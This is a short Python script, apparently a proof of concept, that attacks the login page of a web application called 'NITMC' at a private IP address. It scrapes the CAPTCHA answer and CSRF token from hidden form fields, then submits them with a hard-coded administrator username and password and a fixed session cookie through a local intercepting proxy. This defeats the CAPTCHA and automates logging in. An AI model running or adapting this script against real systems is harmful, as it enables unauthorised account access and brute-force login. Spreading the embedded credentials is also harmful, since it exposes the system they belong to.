import urllib.request
from bs4 import BeautifulSoup
import requests

proxies = {
  "http": "http://127.0.0.1:8080",
  "https": "https://127.0.0.1:8080",
}
opener = urllib.request.FancyURLopener({})
url = "http://10.119.37.48:8443/NITMC/loginPage.tmc"
f = opener.open(url)
content = f.read()
soup = BeautifulSoup(content, 'html.parser')
captchavalue = soup.find("input", {'name': "j_captchaValid"})
csrfvalue = soup.find("input", {'name':"_csrf"})
csrflist=str(csrfvalue).split("\"")
list=str(captchavalue).split("\"")
csrf=csrflist[5]
captcha=list[7]
print(captcha)
print(csrf)
burp0_cookies = {"JSESSIONID": "C3BDB9A73845E19E87C2B2DFC0A2E8F6"}
burp0_headers = {"Cache-Control": "max-age=0", 
"Upgrade-Insecure-Requests": "1", 
"Origin": "http://10.119.37.48:8443", 
"Content-Type": "application/x-www-form-urlencoded",
"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36", 
"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","Referer": "http://10.119.37.48:8443/NITMC/loginPage.tmc", 
"Accept-Encoding": "gzip, deflate", 
"Accept-Language": "en-US,en;q=0.9", 
"Connection": "close"}
url1 = 'http://10.119.37.48:8443/NITMC/j_spring_security_check'
values = {
			'j_username': 'AdminUser',
			'j_password': 'ni12345',
			'j_captcha':captcha,
			'j_captchaValid':captcha,
			'_csrf':csrf
		  }
r = requests.post(url1, data=values, headers=burp0_headers, cookies=burp0_cookies, proxies=proxies)
print(r.content)

